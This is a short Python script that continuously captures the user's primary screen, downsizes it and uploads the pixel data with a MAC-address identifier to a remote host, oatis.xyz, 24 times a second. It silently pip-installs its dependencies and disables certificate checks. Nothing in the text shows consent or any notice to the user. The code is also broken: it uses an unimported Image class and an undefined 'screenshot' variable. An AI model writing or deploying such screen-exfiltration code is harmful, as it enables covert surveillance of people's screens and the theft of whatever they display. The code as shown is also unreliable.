print("Client established.")

from os import system

try:
  from requests import post
  from time import sleep
  from mss import mss
  from mss.tools import to_png
  from uuid import getnode
except: 
  system("pip install requests")
  system("pip install mss")
  system("pip install uuid")

  from requests import post
  from time import sleep
  from mss import mss
  from mss.tools import to_png as to_bytes
  from uuid import getnode

def mainloop(fps):
  while 1:
    print("Loop working...")
    try:
      with mss() as visual:
        image = visual.grab(visual.monitors[1])
        image = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
        image = image.resize((image.width//4, image.height//4))
        name = hex(getnode())
        post(url="http://www.oatis.xyz/stream", json={"pixels": str(list(image.getdata())), "name": str(name)}, verify=False)
        print("Image sent from:", str(name))
    except Exception as e: print(str(e))
    sleep(1/fps)

if __name__ == "__main__":
  mainloop(fps=24)
